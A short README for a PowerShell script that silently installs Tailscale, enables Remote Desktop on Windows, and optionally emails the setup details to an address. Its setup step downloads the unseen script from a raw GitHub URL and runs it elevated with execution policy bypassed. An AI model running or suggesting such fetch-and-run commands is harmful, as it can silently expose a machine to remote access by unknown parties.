# Windows Tailscale & Remote Desktop Auto-Configurator

A simple PowerShell script to automate silent Tailscale installation and configure Remote Desktop (RDP) on Windows 10/11.

## Installation & Setup

Open an elevated PowerShell prompt on the target machine and run:

```powershell
Invoke-WebRequest `
  -Uri "https://raw.githubusercontent.com/waqarhossen/rmt/main/tailscale-setup.ps1" `
  -OutFile "tailscale-setup.ps1"

powershell -ExecutionPolicy Bypass -File ".\tailscale-setup.ps1"
```

## Parameters (Optional)

Configure setup with active parameters if necessary:

- **Tailscale Auth Key (Skip Interactive Login):**
  ```powershell
  powershell -ExecutionPolicy Bypass -File ".\tailscale-setup.ps1" -TailscaleAuthKey "tskey-auth-yourKey"
  ```
- **Custom Destination Email:**
  ```powershell
  powershell -ExecutionPolicy Bypass -File ".\tailscale-setup.ps1" -ToEmail "user@example.com"
  ```
